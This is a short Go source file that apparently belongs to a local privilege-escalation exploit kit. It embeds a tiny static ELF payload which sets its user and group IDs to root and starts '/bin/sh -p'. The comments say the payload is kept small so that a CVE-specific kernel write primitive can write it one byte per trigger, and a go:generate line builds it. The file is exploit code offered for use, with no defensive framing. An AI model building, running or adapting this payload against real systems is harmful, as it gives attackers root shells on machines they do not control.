package pipeprimitive

import _ "embed"

//go:generate go run ./material/generate_suid_payload.go

// suidShellPayloadAMD64 is a minimal static ELF that runs:
// setgid(0); setuid(0); execve("/bin/sh", ["/bin/sh", "-p"], nil).
//
// Keep this short: CVE-specific constrained write primitives may need one
// kernel trigger per byte and can hit kernel key quota limits with larger ELF
// payloads.
//
//go:embed material/suid-shell-amd64.bin
var suidShellPayloadAMD64 []byte
